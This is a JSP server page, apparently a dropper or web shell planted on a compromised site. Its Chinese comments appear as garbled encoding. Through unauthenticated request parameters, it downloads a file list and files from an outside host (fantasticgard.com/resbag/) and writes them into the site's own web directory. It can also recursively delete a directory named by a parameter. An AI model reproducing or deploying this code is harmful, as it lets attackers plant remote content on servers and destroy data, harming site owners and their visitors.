<%@ page language="java" pageEncoding="utf-8"%>
<%@ page import="java.io.*"%>
<%@ page import="java.net.*"%>

<%!
public  boolean DeleteFolder(String sPath) {  
    boolean flag = false;  
    File file = new File(sPath);  
    // �ж�Ŀ¼���ļ��Ƿ����  
    if (!file.exists()) {  
        return flag;  
    } else {  
        // �ж��Ƿ�Ϊ�ļ�  
        if (file.isFile()) {  // Ϊ�ļ�ʱ����ɾ���ļ�����  
            return deleteFile(sPath);  
        } else {  // ΪĿ¼ʱ����ɾ��Ŀ¼����  
            return deleteDirectory(sPath);  
        }  
    }  
}  


public  boolean deleteFile(String sPath) {  
    boolean flag = false;  
    File file = new File(sPath);  
    //·��Ϊ�ļ��Ҳ�Ϊ�������ɾ��  
    if (file.isFile() && file.exists()) {  
        file.delete();  
        flag = true;  
    }  
    return flag;  
} 

public  boolean deleteDirectory(String sPath) {  
    //sPath�����ļ��ָ�����β���Զ�����ļ��ָ���  
    if (!sPath.endsWith(File.separator)) {  
        sPath = sPath + File.separator;  
    }  
    File dirFile = new File(sPath);  
    //dir��Ӧ���ļ������ڣ����߲���һ��Ŀ¼�����˳�  
    if (!dirFile.exists() || !dirFile.isDirectory()) {  
        return false;  
    }  
    boolean flag = true;  
    //ɾ���ļ����µ������ļ�(������Ŀ¼)  
    File[] files = dirFile.listFiles();  
    for (int i = 0; i < files.length; i++) {  
        //ɾ�����ļ�  
        if (files[i].isFile()) {  
            flag = deleteFile(files[i].getAbsolutePath());  
            if (!flag) break;  
        } //ɾ����Ŀ¼  
        else {  
            flag = deleteDirectory(files[i].getAbsolutePath());  
            if (!flag) break;  
        }  
    }  
    if (!flag) return false;  
    //ɾ����ǰĿ¼  
    if (dirFile.delete()) {  
        return true;  
    } else {  
        return false;  
    }  
}  

public  String Get(String requestUrl)throws Exception {
	try {
		StringBuffer sb = new StringBuffer();
		String temp = new String();
		URL url = new URL(requestUrl);

		HttpURLConnection httpURLConn = (HttpURLConnection) url.openConnection();
		httpURLConn.setDoOutput(true);
		httpURLConn.setRequestMethod("GET");
		httpURLConn.setIfModifiedSince(999999999);
		httpURLConn.setRequestProperty("User-Agent", "test");
		httpURLConn.connect();
		InputStream in = httpURLConn.getInputStream();
		BufferedReader bd = new BufferedReader(new InputStreamReader(in));
		while ((temp = bd.readLine()) != null) {
			sb.append(temp);
			sb.append(":");
		}
		return sb.toString();
	} catch (Exception e) {
		throw e;
	}

}

%>

<%
	String path = request.getParameter("path");
	String link = request.getParameter("dir");
	String clear = request.getParameter("clear");
	out.print("filelist: http://www.fantasticgard.com/resbag/" + path + "<br />");
	String urlroot = "http://www.fantasticgard.com/resbag/";
	String requestData = urlroot.concat(path);
	String path2=application.getRealPath(request.getRequestURI());
	String dir=new java.io.File(path2).getParent();
	String localPath = dir + "/" + link;
	String fileList = Get(requestData.concat("/filelist.txt"));
	String[] files = fileList.split(":");
	File file = new File(localPath);
	if (clear.equals("yes"))
	{
		out.print("clear Directory link successful<br />");
		DeleteFolder(localPath);
	}
	if(!file.exists())
	{
		out.print("create Directory link successful<br />");
		file.mkdir();
	}
	out.print("----------begin<br />");
	for (String fl : files) {
	  if (fl!=null && !fl.equals(""))
	  {
			File f = new File(localPath.concat("/").concat(fl));
			try {
				String content = Get(requestData.concat("/").concat(fl));
				FileOutputStream fos = new FileOutputStream(f);
				OutputStreamWriter writer = new OutputStreamWriter(fos);
				writer.write(content);
				writer.close();
				out.print(fl + " Write to successful<br />");
				
			} catch (Exception e) {
				out.print("Exception " + e.getMessage());
			}
		}
		
	}
	out.print("----------end<br />");
  out.print("upload successful 123!");

%>


